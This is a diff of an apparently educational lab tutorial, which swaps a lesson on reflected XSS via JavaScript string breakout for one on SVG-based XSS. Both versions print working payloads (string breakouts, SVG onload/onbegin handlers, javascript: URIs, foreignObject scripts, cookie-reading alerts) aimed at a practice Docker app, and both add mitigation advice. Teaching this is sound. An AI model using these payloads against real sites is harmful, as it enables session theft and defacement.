@@ -1,118 +1,141 @@
-# Reflected XSS in JS string with HTML encoding
+# SVG-Based XSS Vulnerabilities
 
-Cross-site Scripting (XSS) is a critical security vulnerability that allows attackers to inject and execute malicious scripts within a web application. **Reflected XSS** occurs when a user's input is included in the response of a web application without proper sanitization.
+Scalable Vector Graphics (SVG) is an XML-based markup language for describing two-dimensional vector graphics. Unlike raster formats such as JPEG or PNG, SVG images can be scaled infinitely without losing quality, making them ideal for responsive web design.
 
-A specific type of this attack, **Reflected XSS in JS string with HTML encoding.**, arises when user input is inserted into a JavaScript string without proper encoding, allowing attackers to manipulate script execution.
+Web applications that allow users to upload, generate, or input SVG content often do so to provide rich graphics capabilities. Common use cases include:
 
-## Objective
-This lab aims to:
-- Explain **Reflected XSS** within JavaScript strings.
-- Discuss how **angle brackets (`< >`) are HTML-encoded but injection is still possible**.
-- Demonstrate **bypassing techniques** to exploit this vulnerability.
-- Provide **practical examples** of how this can be exploited.
-- Outline **mitigation techniques** to prevent such attacks.
+- Data visualization tools
+- Diagram and flowchart editors
+- Custom icon libraries
+
+
+However, SVG content can also be exploited for XSS attacks, particularly when it is rendered in the browser. In this lab, we will explore how SVG content can be used to perform `Reflected XSS` attacks.
 
 ## What is Reflected XSS?
 
-Reflected XSS is a type of XSS attack where the malicious script is reflected off the web application back to the victim's browser. This type of XSS is common in web applications that handle user input, such as name fields, comment sections, and login forms.
+Reflected XSS is a type of XSS attack where the malicious script is reflected off the web application back to the victim's browser. This type of XSS is common in web applications that handle user input, such as name fields, search fields, comment sections, and login forms.
 
 ![](./images/2.svg)
 
-
 An attacker crafts a malicious URL containing a script and tricks a user into clicking it. The vulnerable website reflects the script in its response without proper sanitization, causing the user's browser to execute it, leading to data theft or session hijacking.
-## JavaScript String Injection
-Reflected XSS in JavaScript strings occurs when **unsanitized user input is placed within a JavaScript string** in a response, such as:
-```html
-<script>
-    var username = "USER_INPUT";
-    document.write("Hello, " + username);
-</script>
+
+## Security Concerns with SVG Input
+
+While SVG provides powerful graphics capabilities, it also introduces significant security risks when user-provided SVG content is rendered without proper sanitization. SVG is fundamentally based on XML and can include:
+
+1. **Executable JavaScript code** via various event handlers
+2. **External resource loading** through links and references
+3. **CSS manipulation** that can affect the entire page
+4. **Complex interactions** with the DOM and browser environment
+
+## SVG-Based XSS Attack Vectors
+
+### 1. Event Handler Execution
+
+SVG elements support numerous event handlers that can execute JavaScript:
+
+```svg
+<svg onload="alert('XSS')"></svg>
 ```
 
-### Why is This Dangerous?
-If **angle brackets (`< >`) are encoded** (converted to `&lt;` and `&gt;` to prevent direct HTML injection), an attacker may still inject **special characters** (such as quotes, backslashes, or function calls) to break out of the JavaScript string and execute arbitrary JavaScript code.
+This simple example will execute the JavaScript code when the SVG element loads.
 
-### How It Works
-Consider this vulnerable script:
-```html
-<script>
-    var username = "John Doe";
-    document.write("Hello, " + username);
-</script>
+### 2. Script Elements within SVG
+
+SVG allows embedding `<script>` elements directly:
+
+```svg
+<svg>
+  <script type="text/javascript">
+    alert('XSS via SVG script element');
+  </script>
+</svg>
 ```
-If an attacker inputs:
+
+### 3. Animation-Based Execution
+
+SVG animation elements can trigger JavaScript:
+
+```svg
+<svg>
+  <animate onbegin="alert('XSS')" attributeName="x" dur="1s" />
+  <set onbegin="alert('XSS')" attributeName="y" to="10" />
+</svg>
 ```
-"; alert(1); //
+
+### 4. SVG Links and References
+
+Links within SVG can use JavaScript URIs:
+
+```svg
+<svg>
+  <a xlink:href="javascript:alert('XSS')">
+    <text x="20" y="20">Click me for XSS</text>
+  </a>
+</svg>
 ```
-The rendered HTML will be:
-```html
-<script>
-    var username = ""; alert(1); //";
-    document.write("Hello, " + username);
-</script>
+
+### 5. Embedded HTML via foreignObject
+
+SVG's `<foreignObject>` element can include HTML content:
+
+```svg
+<svg>
+  <foreignObject>
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <script>alert('XSS via foreignObject')</script>
+    </body>
+  </foreignObject>
+</svg>
 ```
-By using `";` in the input, the attacker breaks out of the JavaScript string and executes `alert(1)` with `;` as a delimiter, demonstrating successful XSS execution.
 
-## How Attackers Exploit This Vulnerability
-Attackers utilize multiple techniques to inject and execute JavaScript within vulnerable scripts:
+### 6. CSS-Based Attacks
 
-![](./images/stringreflectedxss.svg)
+SVG can include style elements with CSS that may leak information:
 
-### 1. Breaking Out of String Quotes
-If quotes are not properly sanitized, attackers can inject:
-
-```html
-<script>
-    var username = ""; alert(1); //";
-</script>
+```svg
+<svg>
+  <style>
+    @import url("data:,*{background-image:url(javascript:alert('XSS'))}");
+  </style>
+</svg>
 ```
-- By using `";` in the input, the attacker breaks out of the JavaScript.
-- Inserting `alert(1)` in the input, the attacker executes `alert(1)` with `;` as a delimiter.
-- As `;` is used as a delimiter, the attacker can execute multiple commands.
-- (`//`)This comments out the closing quote from the original code
 
-### 2. Injecting Function Calls
-An attacker can use JavaScript functions to execute arbitrary code:
-```html
-<script>
-    var username = ""; console.log(document.cookie); //";
-</script>
-```
-- This allows the attacker to steal session cookies.
+## Real-World Impact of SVG XSS
 
-### 3. Using Escape Characters to Break the Syntax
-An attacker can use escape characters (`\`) to manipulate the script:
-```html
-<script>
-    var username = \"; alert(1); //
-</script>
-```
-- This can escape existing string handling mechanisms and inject malicious JavaScript.
+SVG-based XSS can lead to various security breaches:
 
-## How the Bypass Mechanism Works
-1. **JavaScript String Context Misuse**: Attackers **inject closing characters** (`"`, `'`, `;`) to break out of JavaScript strings and execute their payloads.
-2. **Function Calls and Object Access**: Attackers execute malicious functions (e.g., `alert()`, `console.log()`, `fetch()`, etc.) to manipulate the web page.
-3. **Encoding Mismatch**: If `< >` are encoded but quotes and escape characters are not, an attacker can **bypass encoding restrictions**.
-4. **JavaScript Execution Flow Hijacking**: Attackers manipulate JavaScript logic, injecting event handlers, script tags, or redirections.
+1. **Session hijacking**: Attackers can steal user cookies and authenticate as the victim
+2. **Credential theft**: Through phishing forms injected via XSS
+3. **Sensitive data exfiltration**: Reading and transmitting page content
+4. **Website defacement**: Modifying the visual appearance of the application
+5. **Malware distribution**: Redirecting users to malicious downloads
 
-## Practical Application
+## Hands-On Lab with SVG-Based XSS
+
+Now we will see a real world application which is vulnerable to SVG-Based XSS attacks.
+
+To demostrate that on `Poridhi's` Platform, we will deploy a application in `Docker` and then expose it with `Poridhi's` Load Balancer.
 
 ### **Step 1: Pull the Docker Image**
 
 ```bash
-docker pull fazlulkarim105925/reflectedstringxss:latest
+docker pull fazlulkarim105925/reflectedxsswithsvgtag:latest
 ```
 
-### **Step 2: Run the Docker Container**
+### **Step 2: Deploy the Application**
 
 ```bash
-docker run -d -p 8000:8000 fazlulkarim105925/reflectedstringxss
+docker run -p 8000:8000 fazlulkarim105925/reflectedxsswithsvgtag:latest
 ```
 
-### **Step 3: Create a Load Balancer in Poridhi's Cloud**
+### **Step 3: Expose the Application**
 
-Find the `eth0` IP address with `ifconfig` command.
+To expose the application with `Poridhi's` Load Balancer, we need to find the `eth0` IP address of the container. To get the `eth0` IP address, we can use the following command:
 
+```bash
+ifconfig
+```
 ![](./images/3.png)
 
 Create a Load Balancer with the `eth0 IP` address and the port `8000`
@@ -123,101 +146,81 @@ Create a Load Balancer with the `eth0 IP` address and the port `8000`
 
 Access the web application with the the provided `URL` by `loadbalancer`
 
-![](./images/strinjection1.png)
+![](./images/1.png)
+
+This is simple application to render `svg` content. What we need to do is to paster `svg` code in the input area and click on `View` button.
+
+An example of `svg` code is given below:
+
+```svg
+<svg width="200" height="100"> <rect width="200" height="100" fill="blue" stroke="black" stroke-width="2" /> </svg>
+```
+In the output section you will see a blue rectangle rendered.
+
+![](./images/5.png)
 
 ### **Step 5: Exploit the Vulnerability**
 
-Now we will exploit the vulnerability by entering the malicious payload in the name field.
+As we know that `svg` can be vulnerable to `XSS` attacks, we will try to exploit the vulnerability by entering the following `svg` code:
 
-First try with your name (e.g. `Poridhi`). If you click on submit button, you will see a greeting message.
+```svg
+<svg><set attributeName=x onbegin=alert(1)>
+```
+This will execute the `alert(1)` function when the `svg` is loaded. We are using `set` element to trigger the `alert(1)` function with attribute `onbegin`. `onbegin` is an event handler that is triggered when the `svg` is loaded.
 
-![](./images/strinjection2.png)
+![](./images/6.png)
 
-Below the greeting message, you will see a `Section` called `Generated code`. Where we will see the portion of javascript code that is generated by the application from ther `user` input.
+You will see a popup with `1` as the output. Which means that this application is vulnerable to `XSS` attacks.
 
-```bash
-var userName = 'Poridhi';
-document.getElementById('greetingOutput').innerHTML = 'Hello ' + userName + '! Welcome to our demo.';
+You can try other payloads like,
+
+```svg
+<svg><set attributeName=x onbegin=alert(document.cookie)>
+```
+This will execute the `alert(document.cookie)` function when the `svg` is loaded. We are using `set` element to trigger the `alert(document.cookie)` function with attribute `onbegin`. `onbegin` is an event handler that is triggered when the `svg` is loaded.
+
+![](./images/7.png)
+
+You will see a popup with the `cookie` of the application.
+
+## Secure Handling of SVG Input
+
+To prevent SVG-based XSS attacks, applications should implement:
+
+### 1. Content Security Policy (CSP)
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
 ```
 
-**If we observe the generated code, we can see that**
+### 2. SVG Sanitization Libraries
 
-- The `userName` variable is defined within single quotes.
-- An attacker can escape these quotes to break out of the string context.
-- For example, input like: '; alert(1); ' would break the string and allow code execution.
+Use dedicated libraries designed to remove potentially malicious content from SVG:
+- DOMPurify with SVG support enabled
+- SVG-sanitize
+- Ammonia (Rust-based)
 
-**Now try this payload with `html` tag.**
+### 3. Server-Side Validation
 
-```bash
-<script>alert(1)</script>
+- Validate SVG structure and reject unexpected elements
+- Use XML parsers that don't execute scripts
+- Convert SVG to raster formats when possible (losing vector benefits)
+
+### 4. SVG Feature Restriction
+
+Restrict SVG to known-safe elements and attributes:
+```javascript
+const ALLOWED_SVG_ELEMENTS = ['svg', 'circle', 'rect', 'path', 'line', 'polyline', 'polygon', 'text', 'g'];
+const ALLOWED_SVG_ATTRIBUTES = ['width', 'height', 'fill', 'stroke', 'stroke-width', 'x', 'y', 'cx', 'cy', 'r', 'd', 'points', 'transform'];
 ```
-
-![](./images/strinjection3.png)
-
-
-If we observe the `Generated code` section, we can see that the payload is encoded.
-
-```bash
-var userName = '&lt;script&gt;alert(1)&lt;script&gt;';
-document.getElementById('greetingOutput').innerHTML = 'Hello ' + userName + '! Welcome to our demo.';
-```
-
-It means that we can't inject the payload with `html` tag directly in the input field.
-
-Now let's try to exploit the vulnerability by entering the malicious payload in the name field which will bypass the encoding.
-```bash
-'; alert(1); '
-```
-
-**What the above payload does is,**
-
-- It breaks the string context by using `;`
-- It executes `alert(1)`
-
-Now we will see a alert box with `1` as a message will pop up. Which means that the payload is executed. Welcome!!, you have successfully exploited the vulnerability.
-
-
-![](./images/strinjection4.png)
-
-As we have get idea about how to exploit the vulnerability, let's try to exploit the vulnerability with some other payloads.
-
-```bash
-'; document.body.style.backgroundColor='red'; '
-```
-**What the above payload does is,**
-
-- It breaks the string context by using `;`
-- It changes the background color of the body to red.
-
-If we execute the above payload, we will see the background color of the body is changed to red.
-
-![](./images/strinjection5.png)
-
-
-**You can also try out this payloads:**
-```bash
-'; document.title='Hacked!'; '
-```
-
-```bash
-'; document.body.innerHTML='Site Hacked!'; '
-```
-
-```bash
-'; console.log('XSS'); '
-```
-
-## Prevention
-
-- Use JSON.stringify() for JavaScript String Encoding.
-- Custom JavaScript String Escaping Function.
-- Use textContent Instead of innerHTML.
-- HTML Template with Content Security Policy (CSP).
-- Use DOMPurify for HTML Sanitization.
 
 ## Conclusion
-Reflected XSS within JavaScript strings is a severe vulnerability, especially when **only partial encoding is applied**. Attackers can bypass input validation by injecting **quotes, escape characters, and function calls**. To prevent such vulnerabilities:
-- **Sanitize all user input properly**, encoding both quotes (`"`, `'`) and escape characters (`\`).
-- **Use Content Security Policy (CSP)** to restrict script execution.
-- **Avoid inserting user input directly into JavaScript strings**; use safe APIs like `textContent` instead of `innerHTML`.
+
+In this lab, we have seen how `svg` can be vulnerable to `XSS` attacks. We have also seen how to exploit the vulnerability and how to prevent it.
+
+
+
+
+
+
 
